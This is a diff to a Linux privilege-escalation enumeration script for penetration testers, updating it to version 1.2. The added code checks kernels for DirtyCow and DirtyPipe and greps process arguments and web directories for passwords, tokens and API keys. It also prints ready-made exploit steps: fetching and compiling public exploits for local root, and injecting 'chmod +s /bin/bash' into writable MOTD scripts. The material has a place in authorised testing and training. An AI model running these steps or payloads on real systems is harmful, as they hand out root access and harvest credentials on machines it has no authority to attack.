@@ -9,7 +9,7 @@
 # ============================================================================
 #  Linux Privilege Escalation Enumeration Tool
 #  Author : Pentest-Ready
-#  Version: 1.1
+#  Version: 1.2
 #  Usage  : chmod +x privy.sh && ./privy.sh
 # ============================================================================
 
@@ -60,7 +60,7 @@ banner() {
     echo "   ██║     ██║  ██║██║ ╚████╔╝    ██║"
     echo "   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝     ╚═╝"
     echo "  ============================================================================"
-    echo -e "${YLW}   Linux Privilege Escalation Enumeration Tool v1.1${RST}"
+    echo -e "${YLW}   Linux Privilege Escalation Enumeration Tool v1.2${RST}"
     echo -e "${CYN}  ============================================================================${RST}"
     echo ""
 }
@@ -165,6 +165,38 @@ run_cmd "/etc/issue" "cat /etc/issue" "$sys"
 run_cmd "/etc/*-release" "cat /etc/*-release" "$sys"
 run_cmd "Architecture" "uname -mrs" "$sys"
 
+sub_header "Kernel CVE Check" "$sys"
+kernel_ver=$(uname -r | grep -oE '^[0-9]+\.[0-9]+\.[0-9]+' | head -1)
+k_major=$(echo "$kernel_ver" | cut -d. -f1)
+k_minor=$(echo "$kernel_ver" | cut -d. -f2)
+k_patch=$(echo "$kernel_ver" | cut -d. -f3)
+is_dirtycow=0
+is_dirtypipe=0
+if [ -n "$k_major" ] && [ -n "$k_minor" ]; then
+    # DirtyCow CVE-2016-5195: kernel < 4.8.3
+    if [ "$k_major" -lt 4 ]; then
+        is_dirtycow=1
+    elif [ "$k_major" -eq 4 ] && [ "$k_minor" -lt 8 ]; then
+        is_dirtycow=1
+    elif [ "$k_major" -eq 4 ] && [ "$k_minor" -eq 8 ] && [ "${k_patch:-0}" -lt 3 ]; then
+        is_dirtycow=1
+    fi
+    # DirtyPipe CVE-2022-0847: 5.8 <= kernel < 5.16.11
+    if [ "$k_major" -eq 5 ]; then
+        if [ "$k_minor" -ge 8 ] && [ "$k_minor" -lt 16 ]; then
+            is_dirtypipe=1
+        elif [ "$k_minor" -eq 16 ] && [ "${k_patch:-0}" -lt 11 ]; then
+            is_dirtypipe=1
+        fi
+    fi
+fi
+if [ "$is_dirtycow" -eq 1 ]; then
+    finding "Kernel $kernel_ver may be vulnerable to DirtyCow (CVE-2016-5195) — local root!" "$sys"
+fi
+if [ "$is_dirtypipe" -eq 1 ]; then
+    finding "Kernel $kernel_ver may be vulnerable to DirtyPipe (CVE-2022-0847) — local root!" "$sys"
+fi
+
 sub_header "Hostname & Domain" "$sys"
 run_cmd "Hostname" "hostname" "$sys"
 run_cmd "DNS Domain" "dnsdomainname" "$sys"
@@ -210,8 +242,8 @@ if id | grep -qE '\bdisk\b'; then
 fi
 
 sub_header "Sudo Permissions" "$ugo"
-run_cmd "sudo -l" "sudo -l" "$ugo"
-sudo_result=$(sudo -l 2>/dev/null)
+run_cmd "sudo -n -l" "sudo -n -l" "$ugo"
+sudo_result=$(sudo -n -l 2>/dev/null)
 if echo "$sudo_result" | grep -qiE 'NOPASSWD|ALL' 2>/dev/null; then
     finding "Sudo permissions found with NOPASSWD or ALL — check for privesc!" "$ugo"
 fi
@@ -331,9 +363,27 @@ run_cmd "ps aux" "ps aux" "$svc"
 sub_header "Processes Running as Root" "$svc"
 run_cmd "ps aux | grep root" "ps aux | grep root" "$svc"
 
+sub_header "Credentials in Process Arguments" "$svc"
+proc_creds=$(ps auxww 2>/dev/null | grep -iE -- '-p[A-Za-z0-9]|password=|passwd=|--pass[= ]|token=|api[_-]?key=|secret=' | grep -vE 'grep|privy\.sh')
+if [ -n "$proc_creds" ]; then
+    finding "Credentials/tokens detected in process arguments — review ps output!" "$svc"
+    echo "$proc_creds" >> "$svc"
+    echo "" >> "$svc"
+fi
+
 sub_header "Listening Services" "$svc"
 run_cmd "ss -tulnp" "ss -tulnp" "$svc"
 run_cmd "netstat -tulnp" "netstat -tulnp" "$svc"
+
+sub_header "Localhost-Only Services (pivot candidates)" "$svc"
+loopback_svcs=$(ss -tlnp 2>/dev/null | awk 'NR>1 && ($4 ~ /^127\./ || $4 ~ /^\[::1\]/)')
+if [ -n "$loopback_svcs" ]; then
+    echo "  Services bound to loopback only — consider SSH port forwarding to reach them:" >> "$svc"
+    echo "$loopback_svcs" >> "$svc"
+    echo "" >> "$svc"
+    echo "  Example: ssh -L 8080:127.0.0.1:8080 user@target" >> "$svc"
+    echo "" >> "$svc"
+fi
 
 sub_header "Installed Services" "$svc"
 run_cmd "/etc/services (first 50)" "head -50 /etc/services" "$svc"
@@ -411,6 +461,15 @@ fi
 writable_crons_found=$(find /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly -writable -type f 2>/dev/null)
 if [ -w /etc/crontab ]; then
     writable_crons_found="${writable_crons_found:+${writable_crons_found}$'\n'}/etc/crontab"
+fi
+
+sub_header "Writable MOTD Scripts" "$cronned"
+writable_motd=$(find /etc/update-motd.d/ -writable -type f 2>/dev/null)
+if [ -n "$writable_motd" ]; then
+    finding "Writable MOTD script(s) — execute as root on next SSH login!" "$cronned"
+    echo "$writable_motd" | while read -r mf; do
+        echo "       → $mf" >> "$cronned"
+    done
 fi
 
 sub_header "Spool Crons" "$cronned"
@@ -551,11 +610,11 @@ echo -e "${MAG}═════════════════════�
 section_header "SUID/SGID Binaries & Capabilities" "$suid"
 
 sub_header "SUID Binaries (run as owner)" "$suid"
-run_cmd "find / -perm -u=s" "find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null" "$suid"
+run_cmd "find / -perm -u=s" "find / -perm -u=s -type f ! -path '/proc/*' ! -path '/sys/*' -exec ls -la {} \; 2>/dev/null" "$suid"
 
 # Flag known GTFOBins SUID candidates
 gtfo_suid="nmap|vim|find|bash|more|less|nano|cp|mv|awk|perl|python|ruby|gcc|node|php|env|strace|ltrace|taskset|docker|pkexec|doas|aria2c|ash|busybox|cat|chmod|chown|curl|cut|dash|dd|diff|ed|emacs|flock|gdb|git|install|ionice|ip|jq|ksh|ld|logsave|lua|make|mawk|nice|nl|pdb|pic|rsync|run-parts|rvim|screen|sed|setarch|ssh|start-stop-daemon|tar|tclsh|tee|time|timeout|ul|unexpand|unshare|watch|wget|xargs|xxd|zip|zsh"
-suid_hits_full=$(find / -perm -u=s -type f 2>/dev/null | grep -iE "/[^/]*(${gtfo_suid})[^/]*$" 2>/dev/null)
+suid_hits_full=$(find / -perm -u=s -type f ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null | grep -iE "/[^/]*(${gtfo_suid})[^/]*$" 2>/dev/null)
 suid_hits=$(echo "$suid_hits_full" | grep -Eo "[^/]+$")
 if [ -n "$suid_hits" ]; then
     echo "" >> "$suid"
@@ -567,11 +626,11 @@ if [ -n "$suid_hits" ]; then
 fi
 
 sub_header "SGID Binaries (run as group)" "$suid"
-run_cmd "find / -perm -g=s" "find / -perm -g=s -type f -exec ls -la {} \; 2>/dev/null" "$suid"
+run_cmd "find / -perm -g=s" "find / -perm -g=s -type f ! -path '/proc/*' ! -path '/sys/*' -exec ls -la {} \; 2>/dev/null" "$suid"
 
 # Flag known GTFOBins SGID candidates
 gtfo_sgid="crontab|mail|write|wall|ssh-agent|screen|at|batch|chage|dotlockfile|expiry|locate|netstat|ping|newgrp|sg|lockfile|passwd|chfn|chsh|su|pkexec"
-sgid_hits=$(find / -perm -g=s -type f 2>/dev/null | grep -Eo "[^/]+$" | grep -iE "$gtfo_sgid" 2>/dev/null)
+sgid_hits=$(find / -perm -g=s -type f ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null | grep -Eo "[^/]+$" | grep -iE "$gtfo_sgid" 2>/dev/null)
 if [ -n "$sgid_hits" ]; then
     echo "" >> "$suid"
     echo "  [!!] GTFOBins SGID candidates detected:" >> "$suid"
@@ -582,7 +641,7 @@ if [ -n "$sgid_hits" ]; then
 fi
 
 sub_header "Sticky Bit Directories" "$suid"
-run_cmd "find / -perm -1000 -type d" "find / -perm -1000 -type d 2>/dev/null" "$suid"
+run_cmd "find / -perm -1000 -type d" "find / -perm -1000 -type d ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null" "$suid"
 
 sub_header "Files with Capabilities" "$suid"
 run_cmd "getcap -r /" "getcap -r / 2>/dev/null" "$suid"
@@ -751,7 +810,7 @@ done
 sub_header "Config Files with Passwords" "$logs"
 run_cmd "find config files" "find / -maxdepth 4 -name '*.conf' -o -name '*.config' -o -name '*.cfg' -o -name '*.ini' 2>/dev/null | head -30" "$logs"
 run_cmd "grep 'password' in /etc" "grep -rl 'password' /etc/ 2>/dev/null | head -20" "$logs"
-run_cmd "grep 'pass' in /var/www" "grep -rl 'pass' /var/www/ 2>/dev/null | head -20" "$logs"
+run_cmd "grep creds in /var/www" "grep -rIl --include='*.php' --include='*.conf' --include='*.config' --include='*.ini' --include='*.env' --include='*.yml' --include='*.yaml' -E 'password|passwd|api[_-]?key|secret|token' /var/www/ 2>/dev/null | head -20" "$logs"
 
 sub_header "Log Files" "$logs"
 for logf in /var/log/auth.log /var/log/syslog /var/log/messages /var/log/secure \
@@ -1231,6 +1290,36 @@ if [ "$is_baron_vulnerable" -eq 1 ]; then
   \$ git clone https://github.com/blasty/CVE-2021-3156 && cd CVE-2021-3156 && make
   \$ ./sudo-hax-me-a-sandwich
   Alt: https://github.com/worawit/CVE-2021-3156"
+fi
+
+# ── P1: DirtyCow ──────────────────────────────────────────────────────────
+if [ "$is_dirtycow" -eq 1 ]; then
+    exploit_entry "P1" "Kernel $kernel_ver — CVE-2016-5195 (DirtyCow)" \
+"  Local root via copy-on-write race in mm subsystem (kernel < 4.8.3):
+  \$ wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
+  \$ gcc -pthread dirty.c -o dirty -lcrypt
+  \$ ./dirty <new_password>   # adds firefart:<pw>:0:0 to /etc/passwd
+  \$ su firefart"
+fi
+
+# ── P1: DirtyPipe ─────────────────────────────────────────────────────────
+if [ "$is_dirtypipe" -eq 1 ]; then
+    exploit_entry "P1" "Kernel $kernel_ver — CVE-2022-0847 (DirtyPipe)" \
+"  Overwrite read-only files via pipe splice (kernel 5.8 - 5.16.11):
+  \$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
+  \$ cd CVE-2022-0847-DirtyPipe-Exploits && ./compile.sh
+  \$ ./exploit-1   # SUID hijack — gives root shell"
+fi
+
+# ── P1: Writable MOTD ─────────────────────────────────────────────────────
+if [ -n "$writable_motd" ]; then
+    exploit_entry "P1" "Writable MOTD script(s) in /etc/update-motd.d/" \
+"  Inject a payload — runs as root on next SSH login:
+  \$ echo 'chmod +s /bin/bash' >> <writable_motd_script>
+  Then trigger by SSH'ing in (or wait for any user to login).
+  After: /bin/bash -p
+  Writable scripts:
+$(echo "$writable_motd" | sed 's/^/  → /')"
 fi
 
 # ── P3: Writable PATH directory ───────────────────────────────────────────
